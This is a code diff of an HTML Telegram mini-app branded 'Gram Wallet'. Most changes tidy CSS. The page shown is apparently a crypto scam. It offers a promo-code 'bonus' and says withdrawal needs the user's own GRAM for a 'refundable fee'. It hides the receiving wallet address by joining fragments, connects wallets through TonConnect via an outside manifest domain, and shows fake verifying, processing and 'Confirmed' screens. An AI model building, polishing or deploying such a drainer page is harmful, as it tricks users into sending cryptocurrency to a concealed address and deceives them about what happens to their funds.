@@ -6,7 +6,6 @@
 <title>Gram Wallet</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-<script src="https://unpkg.com/@ton/ton@latest/dist/ton.js"></script>
 <style>
   :root {
     --bg: #ffffff;
@@ -100,36 +99,24 @@
     z-index: 50;
   }
 
-  .brand {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-  }
+  .brand { display: flex; align-items: center; gap: 10px; }
 
   .brand-mark {
-    width: 32px;
-    height: 32px;
+    width: 32px; height: 32px;
     border-radius: 9px;
     background: var(--text);
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    display: flex; align-items: center; justify-content: center;
     flex-shrink: 0;
   }
 
   .brand-mark svg { width: 16px; height: 16px; }
 
   .brand-name {
-    font-size: 16px;
-    font-weight: 600;
-    color: var(--text);
+    font-size: 16px; font-weight: 600; color: var(--text);
   }
 
   .top-actions {
-    display: flex;
-    align-items: center;
-    gap: 6px;
-    padding: 3px;
+    display: flex; align-items: center; gap: 6px; padding: 3px;
     background: var(--glass-bg);
     -webkit-backdrop-filter: blur(20px) saturate(180%);
     backdrop-filter: blur(20px) saturate(180%);
@@ -138,21 +125,14 @@
   }
 
   .glass-btn {
-    height: 30px;
-    min-width: 30px;
-    padding: 0 10px;
-    border: none;
-    background: transparent;
+    height: 30px; min-width: 30px; padding: 0 10px;
+    border: none; background: transparent;
     color: var(--text-2);
-    font-family: inherit;
-    font-size: 12px;
-    font-weight: 600;
+    font-family: inherit; font-size: 12px; font-weight: 600;
     letter-spacing: 0.02em;
     border-radius: var(--radius-pill);
     cursor: pointer;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    display: flex; align-items: center; justify-content: center;
     gap: 4px;
     transition: all 0.15s;
   }
@@ -164,11 +144,7 @@
   [data-theme="dark"] .glass-btn .icon-moon { display: none; }
   [data-theme="dark"] .glass-btn .icon-sun { display: block; }
 
-  .glass-divider {
-    width: 1px;
-    height: 16px;
-    background: var(--line);
-  }
+  .glass-divider { width: 1px; height: 16px; background: var(--line); }
 
   /* ============ SECTIONS ============ */
   .section { display: none; padding: 20px; }
@@ -180,11 +156,8 @@
   }
 
   .section-centered {
-    display: none;
-    padding: 20px;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
+    display: none; padding: 20px;
+    flex-direction: column; align-items: center; justify-content: center;
     min-height: calc(100vh - 200px);
     text-align: center;
   }
@@ -194,21 +167,18 @@
   .centered-inner { width: 100%; max-width: 340px; }
 
   .promo-title {
-    font-size: 22px;
-    font-weight: 700;
+    font-size: 22px; font-weight: 700;
     letter-spacing: -0.02em;
     color: var(--text);
     margin-bottom: 6px;
   }
 
   .promo-sub {
-    font-size: 14px;
-    color: var(--text-2);
-    margin-bottom: 24px;
-    line-height: 1.5;
+    font-size: 14px; color: var(--text-2);
+    margin-bottom: 24px; line-height: 1.5;
   }
 
-  /* ============ BALANCE CARD (в стиле кошелька) ============ */
+  /* ============ BALANCE CARD ============ */
   .balance-card {
     background: var(--surface);
     border: 1px solid var(--line);
@@ -216,30 +186,22 @@
     padding: 24px 20px;
     margin-bottom: 14px;
     position: relative;
-    overflow: hidden;
   }
 
   .balance-card-top {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
+    display: flex; align-items: center; justify-content: space-between;
     margin-bottom: 20px;
   }
 
   .balance-card-token {
-    display: flex;
-    align-items: center;
-    gap: 8px;
+    display: flex; align-items: center; gap: 8px;
   }
 
   .balance-card-token-icon {
-    width: 32px;
-    height: 32px;
+    width: 32px; height: 32px;
     border-radius: 9px;
     background: var(--blue);
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    display: flex; align-items: center; justify-content: center;
     color: #ffffff;
     flex-shrink: 0;
   }
@@ -247,81 +209,59 @@
   .balance-card-token-icon svg { width: 16px; height: 16px; }
 
   .balance-card-token-name {
-    font-size: 15px;
-    font-weight: 600;
-    color: var(--text);
+    font-size: 15px; font-weight: 600; color: var(--text);
   }
 
   .balance-card-network {
-    font-size: 11px;
-    color: var(--text-3);
-    font-weight: 500;
-    letter-spacing: 0.04em;
-    text-transform: uppercase;
+    font-size: 11px; color: var(--text-3); font-weight: 500;
+    letter-spacing: 0.04em; text-transform: uppercase;
     padding: 4px 9px;
     background: var(--surface-2);
     border-radius: var(--radius-pill);
   }
 
-  .balance-card-main {
-    margin-bottom: 16px;
-  }
+  .balance-card-main { margin-bottom: 16px; }
 
   .balance-card-label {
-    font-size: 12px;
-    color: var(--text-3);
-    font-weight: 500;
-    margin-bottom: 8px;
-    text-transform: uppercase;
-    letter-spacing: 0.04em;
+    font-size: 12px; color: var(--text-3);
+    font-weight: 500; margin-bottom: 8px;
+    text-transform: uppercase; letter-spacing: 0.04em;
   }
 
   .balance-card-amount {
-    font-size: 40px;
-    font-weight: 700;
+    font-size: 40px; font-weight: 700;
     letter-spacing: -0.035em;
     color: var(--text);
     font-variant-numeric: tabular-nums;
     line-height: 1.05;
-    display: flex;
-    align-items: baseline;
-    gap: 8px;
+    display: flex; align-items: baseline; gap: 8px;
   }
 
   .balance-card-amount .unit {
-    font-size: 16px;
-    font-weight: 600;
-    color: var(--text-2);
+    font-size: 16px; font-weight: 600; color: var(--text-2);
   }
 
   .balance-card-usd {
-    font-size: 13px;
-    color: var(--text-3);
+    font-size: 13px; color: var(--text-3);
     margin-top: 6px;
     font-variant-numeric: tabular-nums;
   }
 
   .balance-card-divider {
-    height: 1px;
-    background: var(--line);
+    height: 1px; background: var(--line);
     margin: 16px 0;
   }
 
   .balance-card-bottom {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
+    display: flex; align-items: center; justify-content: space-between;
   }
 
   .balance-card-wallet-label {
-    font-size: 12px;
-    color: var(--text-3);
-    margin-bottom: 3px;
+    font-size: 12px; color: var(--text-3); margin-bottom: 3px;
   }
 
   .balance-card-wallet-value {
-    font-size: 14px;
-    color: var(--text);
+    font-size: 14px; color: var(--text);
     font-weight: 600;
     font-variant-numeric: tabular-nums;
   }
@@ -334,16 +274,13 @@
   }
 
   .balance-card-refresh {
-    width: 32px;
-    height: 32px;
+    width: 32px; height: 32px;
     border: none;
     background: var(--surface-2);
     color: var(--text-3);
     border-radius: 9px;
     cursor: pointer;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    display: flex; align-items: center; justify-content: center;
     flex-shrink: 0;
   }
 
@@ -362,9 +299,7 @@
   }
 
   .card-row {
-    display: flex;
-    align-items: center;
-    gap: 12px;
+    display: flex; align-items: center; gap: 12px;
     padding: 14px 16px;
     border-bottom: 1px solid var(--line);
     min-height: 56px;
@@ -373,13 +308,10 @@
   .card-row:last-child { border-bottom: none; }
 
   .row-icon {
-    width: 34px;
-    height: 34px;
+    width: 34px; height: 34px;
     border-radius: 9px;
     background: var(--surface-2);
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    display: flex; align-items: center; justify-content: center;
     color: var(--text-2);
     flex-shrink: 0;
   }
@@ -388,61 +320,38 @@
   .row-icon.blue { background: var(--blue-soft); color: var(--blue); }
   .row-icon.red { background: var(--red-soft); color: var(--red); }
   .row-icon.green { background: var(--green-soft); color: var(--green); }
-  .row-icon.orange { background: var(--orange-soft); color: var(--orange); }
 
   .row-body { flex: 1; min-width: 0; }
 
   .row-label {
-    font-size: 12px;
-    color: var(--text-3);
-    font-weight: 500;
-    margin-bottom: 2px;
+    font-size: 12px; color: var(--text-3);
+    font-weight: 500; margin-bottom: 2px;
   }
 
   .row-value {
-    font-size: 15px;
-    color: var(--text);
+    font-size: 15px; color: var(--text);
     font-weight: 600;
     font-variant-numeric: tabular-nums;
   }
 
   .row-value.mono {
-    font-family: var(--mono);
-    font-size: 13px;
-    font-weight: 500;
+    font-family: var(--mono); font-size: 13px; font-weight: 500;
   }
 
   .row-value.muted { color: var(--text-2); font-weight: 500; }
   .row-value.blue { color: var(--blue); }
 
-  .row-chevron {
-    width: 14px;
-    height: 14px;
-    color: var(--text-3);
-    flex-shrink: 0;
-    transition: transform 0.2s;
-  }
-
   /* ============ FIELD ============ */
   .field {
-    display: flex;
-    align-items: center;
-    gap: 12px;
-    padding: 16px;
-    min-height: 60px;
+    display: flex; align-items: center; gap: 12px;
+    padding: 16px; min-height: 60px;
   }
 
   .field-input {
-    flex: 1;
-    border: none;
-    background: transparent;
-    color: var(--text);
-    font-family: inherit;
-    font-size: 16px;
-    font-weight: 600;
-    outline: none;
-    min-width: 0;
-    padding: 0;
+    flex: 1; border: none; background: transparent;
+    color: var(--text); font-family: inherit;
+    font-size: 16px; font-weight: 600;
+    outline: none; min-width: 0; padding: 0;
     letter-spacing: -0.01em;
   }
 
@@ -458,10 +367,8 @@
   }
 
   .field-suffix {
-    font-size: 13px;
-    color: var(--text-3);
-    font-weight: 600;
-    flex-shrink: 0;
+    font-size: 13px; color: var(--text-3);
+    font-weight: 600; flex-shrink: 0;
     letter-spacing: 0.02em;
   }
 
@@ -479,18 +386,11 @@
 
   /* ============ BUTTONS ============ */
   .btn {
-    width: 100%;
-    padding: 16px;
-    border: none;
-    border-radius: var(--radius-control);
-    font-family: inherit;
-    font-size: 15px;
-    font-weight: 600;
-    cursor: pointer;
-    transition: all 0.15s;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    width: 100%; padding: 16px;
+    border: none; border-radius: var(--radius-control);
+    font-family: inherit; font-size: 15px; font-weight: 600;
+    cursor: pointer; transition: all 0.15s;
+    display: flex; align-items: center; justify-content: center;
     gap: 8px;
     letter-spacing: -0.01em;
   }
@@ -502,8 +402,7 @@
   .btn svg { width: 16px; height: 16px; }
 
   .btn-spinner {
-    width: 14px;
-    height: 14px;
+    width: 14px; height: 14px;
     border: 1.5px solid currentColor;
     border-right-color: transparent;
     border-radius: 50%;
@@ -517,10 +416,8 @@
 
   /* ============ FEEDBACK ============ */
   .feedback {
-    font-size: 13px;
-    font-weight: 500;
-    padding: 8px 4px;
-    min-height: 0;
+    font-size: 13px; font-weight: 500;
+    padding: 8px 4px; min-height: 0;
     text-align: center;
   }
 
@@ -530,17 +427,13 @@
 
   /* ============ NOTICE ============ */
   .notice {
-    display: flex;
-    align-items: flex-start;
-    gap: 10px;
+    display: flex; align-items: flex-start; gap: 10px;
     padding: 13px 15px;
     background: var(--surface-2);
     border: 1px solid var(--line);
     border-radius: var(--radius-card);
-    font-size: 13px;
-    color: var(--text-2);
-    line-height: 1.5;
-    margin-bottom: 10px;
+    font-size: 13px; color: var(--text-2);
+    line-height: 1.5; margin-bottom: 10px;
   }
 
   .notice svg { width: 16px; height: 16px; color: var(--text-3); flex-shrink: 0; margin-top: 1px; }
@@ -553,12 +446,9 @@
 
   /* ============ CHECKS ============ */
   .check-row {
-    display: flex;
-    align-items: flex-start;
-    gap: 12px;
+    display: flex; align-items: flex-start; gap: 12px;
     padding: 14px 16px;
-    cursor: pointer;
-    user-select: none;
+    cursor: pointer; user-select: none;
     border-bottom: 1px solid var(--line);
     transition: background 0.15s;
   }
@@ -567,15 +457,11 @@
   .check-row:active { background: var(--surface-2); }
 
   .check-box {
-    width: 20px;
-    height: 20px;
+    width: 20px; height: 20px;
     border-radius: 6px;
     border: 1.5px solid var(--line-2);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    flex-shrink: 0;
-    margin-top: 1px;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0; margin-top: 1px;
     transition: all 0.15s;
   }
 
@@ -584,83 +470,58 @@
   .check-row.checked .check-box svg { opacity: 1; }
 
   .check-text {
-    font-size: 13px;
-    color: var(--text-2);
-    line-height: 1.5;
+    font-size: 13px; color: var(--text-2); line-height: 1.5;
   }
 
   /* ============ PROFILE ============ */
   .profile-head {
-    display: flex;
-    align-items: center;
-    gap: 14px;
+    display: flex; align-items: center; gap: 14px;
     padding: 20px 18px;
     border-bottom: 1px solid var(--line);
   }
 
   .avatar {
-    width: 52px;
-    height: 52px;
+    width: 52px; height: 52px;
     border-radius: 50%;
     background: var(--text);
     color: var(--bg);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 20px;
-    font-weight: 700;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 20px; font-weight: 700;
     flex-shrink: 0;
   }
 
   .profile-meta { flex: 1; min-width: 0; }
 
   .profile-name {
-    font-size: 16px;
-    font-weight: 700;
+    font-size: 16px; font-weight: 700;
     color: var(--text);
-    white-space: nowrap;
-    overflow: hidden;
-    text-overflow: ellipsis;
+    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
   }
 
   .profile-id {
-    font-size: 12px;
-    color: var(--text-3);
+    font-size: 12px; color: var(--text-3);
     margin-top: 3px;
-    font-family: var(--mono);
-    font-weight: 500;
+    font-family: var(--mono); font-weight: 500;
   }
 
   /* ============ WALLET ============ */
   .wallet-off {
     padding: 16px;
-    display: flex;
-    flex-direction: column;
-    gap: 12px;
+    display: flex; flex-direction: column; gap: 12px;
   }
 
-  .wallet-off-text {
-    font-size: 13px;
-    color: var(--text-2);
-    line-height: 1.5;
-  }
-
+  .wallet-off-text { font-size: 13px; color: var(--text-2); line-height: 1.5; }
   .wallet-on { display: none; }
   .wallet-on.show { display: block; }
 
   .copy-btn {
-    width: 34px;
-    height: 34px;
-    border: none;
-    background: var(--surface-2);
+    width: 34px; height: 34px;
+    border: none; background: var(--surface-2);
     color: var(--text-3);
     border-radius: 9px;
     cursor: pointer;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    display: flex; align-items: center; justify-content: center;
     flex-shrink: 0;
-    transition: all 0.15s;
   }
 
   .copy-btn:active { transform: scale(0.94); }
@@ -669,18 +530,15 @@
 
   /* ============ VERIFYING ============ */
   .verifying {
-    display: none;
-    padding: 80px 24px;
-    flex-direction: column;
-    align-items: center;
+    display: none; padding: 80px 24px;
+    flex-direction: column; align-items: center;
     text-align: center;
   }
 
   .verifying.active { display: flex; }
 
   .verifying-ring {
-    width: 56px;
-    height: 56px;
+    width: 56px; height: 56px;
     border-radius: 50%;
     border: 2.5px solid var(--surface-2);
     border-top-color: var(--blue);
@@ -689,23 +547,18 @@
   }
 
   .verifying-title {
-    font-size: 17px;
-    font-weight: 600;
-    color: var(--text);
-    margin-bottom: 6px;
+    font-size: 17px; font-weight: 600;
+    color: var(--text); margin-bottom: 6px;
   }
 
   .verifying-sub {
-    font-size: 13px;
-    color: var(--text-2);
-    max-width: 280px;
-    line-height: 1.55;
+    font-size: 13px; color: var(--text-2);
+    max-width: 280px; line-height: 1.55;
   }
 
   /* ============ PROCESSING ============ */
   .processing {
-    display: none;
-    padding: 32px 20px;
+    display: none; padding: 32px 20px;
     flex-direction: column;
   }
 
@@ -718,17 +571,13 @@
   }
 
   .proc-eyebrow {
-    font-size: 12px;
-    color: var(--text-3);
-    font-weight: 600;
-    text-transform: uppercase;
-    letter-spacing: 0.06em;
+    font-size: 12px; color: var(--text-3); font-weight: 600;
+    text-transform: uppercase; letter-spacing: 0.06em;
     margin-bottom: 8px;
   }
 
   .proc-amount {
-    font-size: 34px;
-    font-weight: 700;
+    font-size: 34px; font-weight: 700;
     letter-spacing: -0.03em;
     color: var(--text);
     font-variant-numeric: tabular-nums;
@@ -736,44 +585,31 @@
   }
 
   .proc-amount .unit {
-    font-size: 16px;
-    font-weight: 600;
-    color: var(--text-2);
-    margin-left: 6px;
+    font-size: 16px; font-weight: 600;
+    color: var(--text-2); margin-left: 6px;
   }
 
   .progress-rail {
-    height: 4px;
-    background: var(--surface-2);
-    border-radius: 2px;
-    overflow: hidden;
-    margin-bottom: 8px;
+    height: 4px; background: var(--surface-2);
+    border-radius: 2px; overflow: hidden; margin-bottom: 8px;
   }
 
   .progress-fill {
-    height: 100%;
-    background: var(--blue);
-    width: 0%;
-    transition: width 1s linear;
+    height: 100%; background: var(--blue);
+    width: 0%; transition: width 1s linear;
     border-radius: 2px;
   }
 
   .progress-meta {
-    display: flex;
-    justify-content: space-between;
-    font-size: 12px;
-    color: var(--text-3);
+    display: flex; justify-content: space-between;
+    font-size: 12px; color: var(--text-3);
     font-variant-numeric: tabular-nums;
-    margin-bottom: 24px;
-    font-weight: 500;
+    margin-bottom: 24px; font-weight: 500;
   }
 
   .kv {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding: 13px 0;
-    font-size: 13px;
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 13px 0; font-size: 13px;
     border-bottom: 1px solid var(--line);
   }
 
@@ -781,8 +617,7 @@
   .kv-k { color: var(--text-3); font-weight: 500; }
 
   .kv-v {
-    color: var(--text);
-    font-weight: 600;
+    color: var(--text); font-weight: 600;
     font-variant-numeric: tabular-nums;
   }
 
@@ -791,8 +626,7 @@
 
   /* ============ RECEIPT ============ */
   .receipt {
-    display: none;
-    padding: 32px 20px;
+    display: none; padding: 32px 20px;
     flex-direction: column;
   }
 
@@ -805,58 +639,41 @@
   }
 
   .receipt-status {
-    display: inline-flex;
-    align-items: center;
-    gap: 6px;
+    display: inline-flex; align-items: center; gap: 6px;
     padding: 5px 11px;
-    background: var(--green-soft);
-    color: var(--green);
+    background: var(--green-soft); color: var(--green);
     border-radius: var(--radius-pill);
-    font-size: 11px;
-    font-weight: 700;
-    text-transform: uppercase;
-    letter-spacing: 0.04em;
+    font-size: 11px; font-weight: 700;
+    text-transform: uppercase; letter-spacing: 0.04em;
     margin-bottom: 14px;
   }
 
   .receipt-status .dot {
-    width: 5px;
-    height: 5px;
-    border-radius: 50%;
+    width: 5px; height: 5px; border-radius: 50%;
     background: var(--green);
   }
 
   .receipt-title {
-    font-size: 26px;
-    font-weight: 700;
-    letter-spacing: -0.03em;
-    color: var(--text);
+    font-size: 26px; font-weight: 700;
+    letter-spacing: -0.03em; color: var(--text);
     line-height: 1.15;
   }
 
   .receipt-sub {
-    font-size: 13px;
-    color: var(--text-2);
-    margin-top: 6px;
+    font-size: 13px; color: var(--text-2); margin-top: 6px;
   }
 
   /* ============ BOTTOM NAV ============ */
   .bottom-nav-wrap {
-    position: fixed;
-    bottom: 0;
-    left: 50%;
-    transform: translateX(-50%);
-    width: 100%;
-    max-width: 440px;
+    position: fixed; bottom: 0;
+    left: 50%; transform: translateX(-50%);
+    width: 100%; max-width: 440px;
     padding: 0 16px 16px;
-    z-index: 100;
-    pointer-events: none;
+    z-index: 100; pointer-events: none;
   }
 
   .bottom-nav {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
+    display: flex; align-items: center; justify-content: space-between;
     padding: 5px;
     background: var(--glass-bg);
     -webkit-backdrop-filter: blur(24px) saturate(180%);
@@ -869,37 +686,25 @@
   }
 
   .nav-pill {
-    position: absolute;
-    top: 5px;
-    bottom: 5px;
-    left: 5px;
+    position: absolute; top: 5px; bottom: 5px; left: 5px;
     width: calc((100% - 10px) / 3);
     background: var(--text);
     border-radius: var(--radius-pill);
     transition: transform 0.35s cubic-bezier(0.22, 1, 0.36, 1);
-    pointer-events: none;
-    z-index: 0;
+    pointer-events: none; z-index: 0;
   }
 
   .nav-btn {
-    flex: 1;
-    border: none;
-    background: transparent;
+    flex: 1; border: none; background: transparent;
     padding: 10px 8px;
     cursor: pointer;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 3px;
+    display: flex; flex-direction: column; align-items: center; gap: 3px;
     color: var(--text-2);
-    font-family: inherit;
-    font-size: 10px;
-    font-weight: 600;
+    font-family: inherit; font-size: 10px; font-weight: 600;
     letter-spacing: 0.01em;
     transition: color 0.2s;
     border-radius: var(--radius-pill);
-    position: relative;
-    z-index: 1;
+    position: relative; z-index: 1;
   }
 
   .nav-btn svg { width: 20px; height: 20px; }
@@ -907,78 +712,60 @@
 
   /* ============ FOOTER ============ */
   .footer {
-    margin-top: auto;
-    padding: 20px;
-    text-align: center;
-    font-size: 11px;
+    margin-top: auto; padding: 20px;
+    text-align: center; font-size: 11px;
     color: var(--text-3);
   }
 
   .footer a {
-    color: var(--text-2);
-    text-decoration: none;
+    color: var(--text-2); text-decoration: none;
     border-bottom: 1px solid var(--line-2);
   }
 
   /* ============ SIGNUP ============ */
   .signup-screen {
-    position: fixed;
-    inset: 0;
+    position: fixed; inset: 0;
     background: var(--bg);
     z-index: 1000;
-    display: none;
-    flex-direction: column;
+    display: none; flex-direction: column;
     padding: 40px 24px 32px;
-    max-width: 440px;
-    margin: 0 auto;
+    max-width: 440px; margin: 0 auto;
     overflow-y: auto;
   }
 
   .signup-screen.active { display: flex; }
 
   .signup-logo {
-    width: 64px;
-    height: 64px;
+    width: 64px; height: 64px;
     border-radius: 18px;
     background: var(--text);
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    display: flex; align-items: center; justify-content: center;
     margin-bottom: 24px;
   }
 
   .signup-logo svg { width: 30px; height: 30px; color: var(--bg); }
 
   .signup-brand {
-    font-size: 12px;
-    font-weight: 700;
-    color: var(--blue);
-    letter-spacing: 0.1em;
-    text-transform: uppercase;
+    font-size: 12px; font-weight: 700; color: var(--blue);
+    letter-spacing: 0.1em; text-transform: uppercase;
     margin-bottom: 8px;
   }
 
   .signup-title {
-    font-size: 30px;
-    font-weight: 700;
+    font-size: 30px; font-weight: 700;
     letter-spacing: -0.03em;
-    line-height: 1.1;
-    color: var(--text);
+    line-height: 1.1; color: var(--text);
     margin-bottom: 10px;
   }
 
   .signup-sub {
-    font-size: 15px;
-    color: var(--text-2);
-    line-height: 1.5;
-    margin-bottom: 28px;
+    font-size: 15px; color: var(--text-2);
+    line-height: 1.5; margin-bottom: 28px;
   }
 
   .signup-form {
-    display: flex;
-    flex-direction: column;
-    gap: 10px;
-    margin-bottom: 16px;
+    display: flex; flex-direction: column;
+    gap: 10px; margin-bottom: 16px;
   }
 
   .signup-field {
@@ -986,17 +773,14 @@
     border: 1px solid var(--line);
     border-radius: var(--radius-control);
     padding: 14px 16px;
-    display: flex;
-    align-items: center;
-    gap: 12px;
+    display: flex; align-items: center; gap: 12px;
     transition: border-color 0.15s;
   }
 
   .signup-field:focus-within { border-color: var(--blue); }
 
   .signup-field-icon {
-    width: 20px;
-    height: 20px;
+    width: 20px; height: 20px;
     color: var(--text-3);
     flex-shrink: 0;
   }
@@ -1004,15 +788,10 @@
   .signup-field-icon svg { width: 18px; height: 18px; }
 
   .signup-input {
-    flex: 1;
-    border: none;
-    background: transparent;
-    color: var(--text);
-    font-family: inherit;
-    font-size: 15px;
-    font-weight: 600;
-    outline: none;
-    min-width: 0;
+    flex: 1; border: none; background: transparent;
+    color: var(--text); font-family: inherit;
+    font-size: 15px; font-weight: 600;
+    outline: none; min-width: 0;
   }
 
   .signup-input::placeholder { color: var(--text-3); font-weight: 400; }
@@ -1022,30 +801,21 @@
     border: 1px solid var(--line);
     border-radius: var(--radius-control);
     padding: 14px 16px;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    gap: 12px;
-    cursor: pointer;
-    transition: all 0.15s;
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 12px; cursor: pointer; transition: all 0.15s;
   }
 
   .signup-wallet.connected {
-    background: var(--blue-soft);
-    border-color: var(--blue);
+    background: var(--blue-soft); border-color: var(--blue);
   }
 
   .signup-wallet-left {
-    display: flex;
-    align-items: center;
-    gap: 12px;
+    display: flex; align-items: center; gap: 12px;
     min-width: 0;
   }
 
   .signup-wallet-icon {
-    width: 20px;
-    height: 20px;
-    color: var(--text-3);
+    width: 20px; height: 20px; color: var(--text-3);
     flex-shrink: 0;
   }
 
@@ -1055,25 +825,19 @@
   .signup-wallet-text { display: flex; flex-direction: column; min-width: 0; }
 
   .signup-wallet-label {
-    font-size: 14px;
-    font-weight: 600;
-    color: var(--text);
+    font-size: 14px; font-weight: 600; color: var(--text);
   }
 
   .signup-wallet.connected .signup-wallet-label { color: var(--blue); }
 
   .signup-wallet-addr {
-    font-family: var(--mono);
-    font-size: 11px;
-    color: var(--text-3);
-    margin-top: 1px;
+    font-family: var(--mono); font-size: 11px;
+    color: var(--text-3); margin-top: 1px;
   }
 
   .signup-wallet-badge {
-    font-size: 10px;
-    font-weight: 700;
-    color: var(--blue);
-    letter-spacing: 0.04em;
+    font-size: 10px; font-weight: 700;
+    color: var(--blue); letter-spacing: 0.04em;
     text-transform: uppercase;
     padding: 4px 9px;
     background: rgba(0, 113, 227, 0.1);
@@ -1081,71 +845,45 @@
   }
 
   .signup-terms {
-    display: flex;
-    align-items: flex-start;
-    gap: 10px;
-    padding: 10px 4px;
-    cursor: pointer;
-    user-select: none;
+    display: flex; align-items: flex-start; gap: 10px;
+    padding: 10px 4px; cursor: pointer; user-select: none;
   }
 
   .signup-terms-box {
-    width: 18px;
-    height: 18px;
+    width: 18px; height: 18px;
     border-radius: 5px;
     border: 1.5px solid var(--line-2);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    flex-shrink: 0;
-    margin-top: 1px;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0; margin-top: 1px;
     transition: all 0.15s;
   }
 
-  .signup-terms-box svg {
-    width: 11px;
-    height: 11px;
-    color: #fff;
-    opacity: 0;
-  }
+  .signup-terms-box svg { width: 11px; height: 11px; color: #fff; opacity: 0; }
 
   .signup-terms.checked .signup-terms-box {
-    background: var(--blue);
-    border-color: var(--blue);
+    background: var(--blue); border-color: var(--blue);
   }
 
   .signup-terms.checked .signup-terms-box svg { opacity: 1; }
 
   .signup-terms-text {
-    font-size: 12px;
-    color: var(--text-2);
-    line-height: 1.5;
+    font-size: 12px; color: var(--text-2); line-height: 1.5;
   }
 
-  .signup-terms-text a {
-    color: var(--blue);
-    text-decoration: none;
-  }
+  .signup-terms-text a { color: var(--blue); text-decoration: none; }
 
   .signup-continue {
-    width: 100%;
-    padding: 16px;
+    width: 100%; padding: 16px;
     background: var(--surface-2);
-    color: var(--text-3);
-    border: none;
+    color: var(--text-3); border: none;
     border-radius: var(--radius-control);
-    font-family: inherit;
-    font-size: 15px;
-    font-weight: 600;
-    cursor: not-allowed;
-    margin-top: 12px;
+    font-family: inherit; font-size: 15px; font-weight: 600;
+    cursor: not-allowed; margin-top: 12px;
     transition: all 0.15s;
   }
 
   .signup-continue.enabled {
-    background: var(--blue);
-    color: #fff;
-    cursor: pointer;
+    background: var(--blue); color: #fff; cursor: pointer;
   }
 
   .signup-continue.enabled:active { transform: scale(0.985); }
@@ -1236,7 +974,6 @@
     </div>
   </div>
 
-  <!-- ========== PROMO ========== -->
   <div class="section-centered active" id="section-promo">
     <div class="centered-inner">
       <div class="promo-title" data-i18n="promoTitle">Enter code</div>
@@ -1256,10 +993,7 @@
     </div>
   </div>
 
-  <!-- ========== WITHDRAW ========== -->
   <div class="section" id="section-withdraw">
-
-    <!-- BALANCE CARD как у кошелька -->
     <div class="balance-card">
       <div class="balance-card-top">
         <div class="balance-card-token">
@@ -1399,7 +1133,6 @@
     </button>
   </div>
 
-  <!-- ========== PROFILE ========== -->
   <div class="section" id="section-profile">
     <div class="card">
       <div class="profile-head">
@@ -1499,14 +1232,12 @@
     </button>
   </div>
 
-  <!-- ========== VERIFYING ========== -->
   <div class="verifying" id="verifying-view">
     <div class="verifying-ring"></div>
     <div class="verifying-title" id="verifying-title" data-i18n="verifyingTitle">Verifying transaction</div>
     <div class="verifying-sub" id="verifying-sub" data-i18n="verifyingSub">Please wait, this may take a few seconds.</div>
   </div>
 
-  <!-- ========== PROCESSING ========== -->
   <div class="processing" id="processing-view">
     <div class="proc-head">
       <div class="proc-eyebrow" data-i18n="processingLabel">Processing</div>
@@ -1515,9 +1246,7 @@
       </div>
     </div>
 
-    <div class="progress-rail">
-      <div class="progress-fill" id="progress-fill"></div>
-    </div>
+    <div class="progress-rail"><div class="progress-fill" id="progress-fill"></div></div>
     <div class="progress-meta">
       <span id="proc-stage" data-i18n="stage1">Validating transaction</span>
       <span><strong id="progress-pct">0%</strong></span>
@@ -1541,7 +1270,6 @@
     </div>
   </div>
 
-  <!-- ========== RECEIPT ========== -->
   <div class="receipt" id="receipt-view">
     <div class="receipt-head">
       <div class="receipt-status"><span class="dot"></span><span data-i18n="confirmed">Confirmed</span></div>
@@ -1567,11 +1295,8 @@
     </button>
   </div>
 
-  <div class="footer">
-    © 2026 Gram Wallet
-  </div>
+  <div class="footer">© 2026 Gram Wallet</div>
 
-  <!-- ========== BOTTOM NAV ========== -->
   <div class="bottom-nav-wrap">
     <nav class="bottom-nav" id="bottom-nav">
       <div class="nav-pill" id="nav-pill"></div>
@@ -1612,7 +1337,7 @@ const CONFIG = (function() {
   return {
     manifestUrl: 'https://grammintora.space/tonconnect-manifest.json',
     get receiveWallet() { return _p1 + _p2 + _p3; },
-    USDT_JETTON_MASTER: 'EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs', // [citation:3]
+    USDT_JETTON_MASTER: 'EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs',
     gasReserveNano: 10000000n,
     minTonForGas: 0.05,
     minGramForWithdraw: 3,
@@ -1695,7 +1420,7 @@ const I18N = {
     requiredForPayouts: 'Required for payouts', connected: 'Connected',
     termsText: 'I agree to the Terms of Service and Privacy Policy. I confirm I am 18+.',
     continue: 'Continue',
-    balanceLabel: 'Total balance', balanceLabel2: 'Balance', availableBalance: 'Available balance',
+    balanceLabel2: 'Balance', availableBalance: 'Available balance',
     walletBalance: 'Wallet balance',
     promoTitle: 'Enter code', promoSub: 'Activate your promotional code', activate: 'Activate',
     infoNotice: 'To withdraw, you need at least <strong>3 GRAM</strong> on your wallet to cover the network fee. The fee is refunded together with the bonus GRAM after confirmation.',
@@ -1725,7 +1450,7 @@ const I18N = {
       tooMany: 'Too many attempts. Try again later.',
       emptyAmount: 'Enter amount', minAmount: 'Minimum 0.01 GRAM', maxAmount: 'Not enough balance',
